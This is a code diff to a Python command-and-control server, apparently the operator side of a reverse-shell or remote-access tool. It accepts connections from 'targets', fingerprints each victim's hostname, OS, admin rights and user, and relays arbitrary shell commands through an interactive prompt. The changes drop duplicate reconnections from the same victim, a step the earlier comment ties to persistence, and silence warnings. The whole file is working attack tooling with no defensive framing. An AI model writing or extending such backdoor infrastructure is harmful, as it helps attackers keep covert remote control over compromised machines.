@@ -2,6 +2,7 @@ import socket
 import threading
 import time
 from datetime import datetime
+import select
 
 class Server:
     def __init__(self):
@@ -19,19 +20,28 @@ class Server:
         t1 = threading.Thread(target=self.welcome_new_connection)
         t1.start()
 
-    # TODO refuse connection if target is already connected (for persistence with frequent reconnection tries)
+    # TODO solve bug when client fails
     def welcome_new_connection(self):
         while True:
             try:
                 new_target = Target()
+                new_target.accept_connection(self)
                 new_target.get_all_infos(self)
-                self.list_of_targets.append(new_target)
-                print(f"\n[+] Connection recieved from {new_target.ip}.")
-                print(f"    \___ time of connection : {new_target.time_record}")
-                print(f"    \___ port used on the client : {new_target.port}\n\n(listening) Enter_command#> ", end="")
+                redundant = False
+                for connected_target in self.list_of_targets:
+                    if (new_target.ip == connected_target.ip) and (new_target.user == connected_target.user):
+                        redundant = True
+                if not redundant:
+                    self.list_of_targets.append(new_target)
+                    print(f"\n[+] Connection recieved from {new_target.ip}.")
+                    print(f"    \___ time of connection : {new_target.time_record}")
+                    print(f"    \___ port used on the client : {new_target.port}\n\n(listening) Enter_command#> ", end="")
+                else:
+                    self.send_message(new_target.id, "exit")
             except Exception:
                 if self.is_listening:
                     self.current_socket.close()
+                    self.is_listening = False
                 break
     
     def handle_single_target_communication(self, target_index):
@@ -55,7 +65,7 @@ class Server:
                     print("[-] Connection closed.\n")
                     break     
                 # commands to be sent to client
-                else :      
+                else:      
                     self.send_message(target.id, message)
                     response = self.recieve_message(target.id)
                     if response == "exit":
@@ -73,7 +83,7 @@ class Server:
                 print("[-] Connection closed.\n")
                 break
             except Exception:
-                self.current_socket.close()
+                # self.current_socket.close()
                 break
 
     def reset(self):
@@ -112,7 +122,7 @@ class Target:
         server.send_message(self.id, "whoami")
         user_id = server.recieve_message(self.id).rstrip("\n")
         if len(user_id.split()) > 5:
-            print(f"[-] Warning : couldn't resolve user id for {self.ip}.\n")
+            # print(f"[-] Warning : couldn't resolve user id for {self.ip}.\n")
             user_id = "[unresolved]"
         self.user = user_id
 
@@ -132,7 +142,7 @@ class Target:
         try:
             self.hostname = socket.gethostbyaddr(self.ip)[0]
         except Exception:
-            print(f"\n[-] Couldn't resolve hostname for client {self.ip}.")
+            # print(f"\n[-] Couldn't resolve hostname for client {self.ip}.")
             self.hostname = "[unresolved]"
         if self.hostname is not None:
             self.fullname = self.hostname + "@" + self.ip
@@ -140,12 +150,15 @@ class Target:
     def get_os(self, server):
         self.os = server.recieve_message(self.id)
 
-    def get_all_infos(self, server):
+    def accept_connection(self, server):
         self.id, ip_and_port = server.current_socket.accept()
         self.ip = ip_and_port[0]
         self.port = ip_and_port[1]
+        
+    def get_all_infos(self, server):
         self.get_time_record()
         self.get_host_and_full_names()
         self.get_admin_infos(server)
         self.get_os(server)
+        # TODO thread gets stuck here and only closing distant connection will free it
         self.get_username(server)
